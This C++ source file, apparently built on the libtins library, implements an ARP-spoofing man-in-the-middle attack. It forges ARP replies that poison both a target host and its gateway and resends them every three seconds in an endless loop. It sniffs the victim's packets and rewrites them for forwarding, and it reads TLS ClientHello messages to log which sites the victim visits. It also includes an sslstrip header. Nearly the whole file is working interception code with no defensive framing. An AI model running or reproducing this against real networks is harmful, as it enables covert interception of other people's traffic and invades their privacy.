#include "./arpspoof.h"
#include "../sslstrip/ssl.h"
#include <unistd.h>
#include <future>
using std::cout;
using std::endl;

EthernetII ArpSpoofer::MakeArpReply(IPv4Address to, IPv4Address from, HWAddress<6> toHw) {
    ARP arp(to, from, toHw, info.hw_addr);
    arp.opcode(ARP::REPLY);                
    cout<< arp.target_hw_addr().to_string()<<endl;    
    return EthernetII(toHw, info.hw_addr) / arp;   
}

ArpSpoofer::ArpSpoofer(IPv4Address target, IPv4Address my, IPv4Address gw, std::string device) : targetIp(target), myIp(my), gwIp(gw), 
                        device(device){

                            PacketSender sender;                            
                            this->iface =  NetworkInterface(device);                        
                            this->info = this->iface.addresses(); 
                            this->gwHwAddr = Utils::resolve_hwaddr(iface,gwIp,sender);
                            this->targetHwAddr = Utils::resolve_hwaddr(iface,targetIp,sender);                            
                            this->toGw = MakeArpReply(gw,target,gwHwAddr);                            
                            this->toTarget = MakeArpReply(target, gw, targetHwAddr);                                                                            
                            this->targetInfo = ForwardParam(this->gwIp, this->targetIp, this->gwHwAddr, this->targetHwAddr, device, this->myIp);
                            this->gwInfo = ForwardParam(this->targetIp, this->gwIp, this->targetHwAddr, this->gwHwAddr, device, this->myIp);                            
                            this->arpSender = PacketSender(device);
}

void ArpSpoofer::doArpspoof() {    
    cout<<"=====do arp====="<<endl;
    cout<<"d: "<<toGw.dst_addr().to_string()<<endl;      
    cout<<"t ip: "<<toGw.rfind_pdu<ARP>().target_ip_addr().to_string()<<endl;
    cout<<"t hw: "<<toGw.rfind_pdu<ARP>().target_hw_addr().to_string()<<endl;
    cout<<"=====do arp====="<<endl;
    cout<<"d: "<<toTarget.dst_addr().to_string()<<endl;      
    cout<<"t ip: "<<toTarget.rfind_pdu<ARP>().target_ip_addr().to_string()<<endl;
    cout<<"t hw: "<<toTarget.rfind_pdu<ARP>().target_hw_addr().to_string()<<endl;
    int i=0;
    std::ios::sync_with_stdio(false);
    while(true) {
        cout << i++ <<endl;
        this->arpSender.send(toGw,iface);        
        this->arpSender.send(toTarget,iface);                    
        sleep(3);
    }
}

EthernetII ArpSpoofer::modifyPacket(PDU* pdu, ForwardParam& p) {
    std::ios::sync_with_stdio(false);
    EthernetII newEth = EthernetII(p.toHw,info.hw_addr)/IP(p.to,myIp);
    // cout << "catched " + p.from.to_string() << endl;
    switch (pdu->rfind_pdu<IP>().inner_pdu()->pdu_type())
    {
        case PDU::TCP : {            
            // cout << "TCP" << endl;
            TCP myTcp = pdu->rfind_pdu<TCP>();
            if (myTcp.dport() == 443) {
                TLS *tls = new TLS(myTcp.serialize());
                if(tls->handshake.type.num == Htype_t::CLIENT_HELLO) {
                    cout << tls->handshake.Extensions.server_names() << endl;
                } else {
                    cout<<"...."<<endl;
                }   
                delete tls;
            } else {
                newEth /= myTcp;
            }
            break;
        }

        case PDU::UDP : {
            // cout << "UDP" << endl;
            newEth /= pdu->rfind_pdu<UDP>();
            break;
        }

        default :{
            // cout << "NOT DECLEARED" << endl;
            newEth /= pdu->rfind_pdu<RawPDU>();
            break;
        }
    }
    try{
        return newEth;
    } catch(...) {
        return EthernetII(NULL);
    }
}

void ArpSpoofer::setPacketBuffer(ForwardParam p, Array a)
{
    SnifferConfiguration config;
    PDU *pdu = nullptr;
    Packet pk;
    config.set_filter("ip src " + p.from.to_string());
    config.set_immediate_mode(true);
    NetworkInterface::Info info(NetworkInterface(this->device).addresses());
    Sniffer sniffer(device, config);
    while (true)
    {
        pk = sniffer.next_packet();
        if (!pk.pdu())  continue;
        pdu = pk.pdu();
        if (!pdu->find_pdu<EthernetII>())  continue;
        auto fut = std::async(std::launch::async, [&a,this,&pdu,&p](){
            static int index = 0;
            a[index++] = this->modifyPacket(pdu,p);
            if(index == BufSize) 
                index=0;            
        });
        fut.get();
    }
}
